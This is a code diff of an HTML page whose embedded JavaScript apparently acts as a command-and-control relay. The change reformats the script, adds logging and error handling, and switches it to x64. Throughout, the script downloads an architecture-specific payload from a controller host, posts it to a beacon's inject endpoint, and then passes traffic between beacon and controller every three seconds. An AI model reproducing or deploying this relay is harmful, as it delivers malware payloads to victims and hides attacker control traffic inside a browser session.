@@ -3,90 +3,94 @@
 </head>
 <body>
 
-<script type="text/javascript">
-	
-var beaconURL = "BEACON_URL"; 
-var controllerURL = "CONTROLLER_URL";
-var arch = "x86";
+    <script type="text/javascript">
 
+        var beaconURL = "BEACON_URL";
+        var controllerURL = "CONTROLLER_URL";
+        var arch = "x64";
 
-function sendToBeacon(data){
-	// will return data from beacon
-		// Send data to the controller
-	var xhr = new XMLHttpRequest();
-	xhr.open( "POST", beaconURL + "send/", false ); // false for synchronous request
-    xhr.send(data);
-
-
-    // Receives data from the controller
-    var response = new XMLHttpRequest();
-    response.open( "GET", beaconURL + "receive/", false );
-    response.send(null);
-
-  	return response.responseText;
-
-}
-
-function sendToController(data){
-	// Send data to the controller
-	var xhr = new XMLHttpRequest();
-	xhr.open( "POST", controllerURL + "send/", false ); // false for synchronous request
-    xhr.send(data);
-    // Receives data from the controller
-    var response = new XMLHttpRequest();
-    response.open( "GET", controllerURL + "receive/", false );
-    response.send(null);
-
-  	return response.responseText;
-
-}
-
-function getPayload(){
-	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open( "GET", controllerURL + "arch/" + arch, false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
-}
-
-function injectPayload(){
-	var xhr = new XMLHttpRequest();
-	xhr.open( "POST", beaconURL + "inject", false ); // false for synchronous request
-    xhr.send( getPayload() );
-   return xhr.responseText;
-}
-
-function isAlive(){
-
-	return true;
-
-}
-
-window.setTimeout(
-    function () {
-        var send_to_beacon;
-        var send_to_controller;
-        if (isAlive()) {
-          
-            send_to_controller = injectPayload();
-            
-            window.setInterval(function () {
-
-                send_to_beacon = sendToController(send_to_controller);
-                send_to_controller = sendToBeacon(send_to_beacon);
-               
-
-            }, 3000);
-
+        function sendToBeacon(data) {
+            try {
+                console.log("Sending to beacon: ", data);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", beaconURL + "send/", false);
+                xhr.send(data);
+                var response = new XMLHttpRequest();
+                response.open("GET", beaconURL + "receive/", false);
+                response.send(null);
+                console.log("Received from beacon: ", response.responseText);
+                return response.responseText;
+            } catch (e) {
+                console.error("Error in sendToBeacon: ", e);
+                return null;
+            }
         }
+
+        function sendToController(data) {
+            try {
+                console.log("Sending to controller: ", data);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", controllerURL + "send/", false);
+                xhr.send(data);
+                var response = new XMLHttpRequest();
+                response.open("GET", controllerURL + "receive/", false);
+                response.send(null);
+                console.log("Received from controller: ", response.responseText);
+                return response.responseText;
+            } catch (e) {
+                console.error("Error in sendToController: ", e);
+                return null;
+            }
+        }
+
+        function getPayload() {
+            try {
+                console.log("Getting payload.");
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", controllerURL + "arch/" + arch, false);
+                xhr.send(null);
+                console.log("Received payload: ", xhr.responseText);
+                return xhr.responseText;
+            } catch (e) {
+                console.error("Error in getPayload: ", e);
+                return null;
+            }
+        }
+
+        function injectPayload() {
+            try {
+                console.log("Injecting payload.");
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", beaconURL + "inject", false);
+                xhr.send(getPayload());
+                console.log("Injection result: ", xhr.responseText);
+                return xhr.responseText;
+            } catch (e) {
+                console.error("Error in injectPayload: ", e);
+                return null;
+            }
+        }
+
+        function isAlive() {
+            console.log("Checking if alive.");
+            return true;
+        }
+
+        setTimeout(function () {
+            console.log("Initial timeout complete. Starting process.");
+            var send_to_beacon;
+            var send_to_controller;
+            if (isAlive()) {
+                send_to_controller = injectPayload();
+                setInterval(function () {
+                    console.log("Interval triggered.");
+                    send_to_beacon = sendToController(send_to_controller);
+                    send_to_controller = sendToBeacon(send_to_beacon);
+                }, 3000);
+            }
         }, 3000);
 
-
-</script>
-	
-
+    </script>
 
 </body>
-	
-
-
 </html>
